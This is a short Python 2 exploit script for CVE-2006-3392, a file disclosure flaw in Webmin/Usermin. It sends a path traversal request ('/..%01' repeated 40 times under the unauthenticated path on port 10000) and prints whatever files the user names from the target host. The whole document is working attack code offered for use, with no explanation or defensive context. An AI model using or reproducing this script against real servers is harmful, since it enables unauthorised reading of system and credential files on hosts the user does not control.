#!/usr/bin/env python
"""
CVE-2006-3392 
Webmin/Usermin arbitrary file disclosure vulnerability exploit in python
"""
import urllib
import sys

def get_file(host, fname):
	tmp = r"/..%01" * 40
	r = urllib.urlopen("http://" + host + ":10000"  + '/unauthenticated/' 
			+ tmp + fname)
	return r.read()

def main():
	if len(sys.argv) < 3:
		print "%s <host> [<fname>, <fname> ...]"
		sys.exit(1)

	host = sys.argv[1]
	for fn in sys.argv[2:]:
		print get_file(host, fn)

if __name__ == '__main__':
    main()
